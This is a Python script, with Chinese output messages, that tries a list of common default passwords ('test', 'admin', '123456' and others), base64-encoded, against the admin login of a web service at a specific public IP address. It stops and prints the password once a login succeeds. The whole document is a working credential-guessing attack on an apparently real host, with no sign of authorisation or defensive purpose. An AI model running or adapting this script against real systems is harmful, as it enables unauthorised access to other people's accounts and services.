#http://222.64.129.45:5000/
import requests
import json
import base64

url = "http://222.64.129.45:5000/va.do"
data = {
    "Cmd": "Login",
    "LoginType": "1",
    "lang": "CHS",
    "PostStr1": "admin",
}
headers = {
    "Accept": "text/html, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "http://222.64.129.45:5000",
    "Referer": "http://222.64.129.45:5000/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "keep-alive"
}

passwords = ["test", "admin", "123456", "demo", "password"]

for password in passwords:
    encoded_password = base64.b64encode(password.encode('utf-8')).decode('utf-8')
    data["PostStr2"] = encoded_password

    try:
        response = requests.post(url, data=data, headers=headers)
        response.raise_for_status()  # Check for HTTP errors

        if response.status_code == 200:
            try:
                json_response = response.json()
                if json_response.get("Ret") == "OK":
                    print(f"登录成功，密码为: {password}")
                    # print("用户全名:", json_response.get("UserFullName"))
                    break
            except json.JSONDecodeError:
                print("响应不是有效的JSON格式")
    except requests.exceptions.RequestException as e:
        print(f"请求错误: {e}")
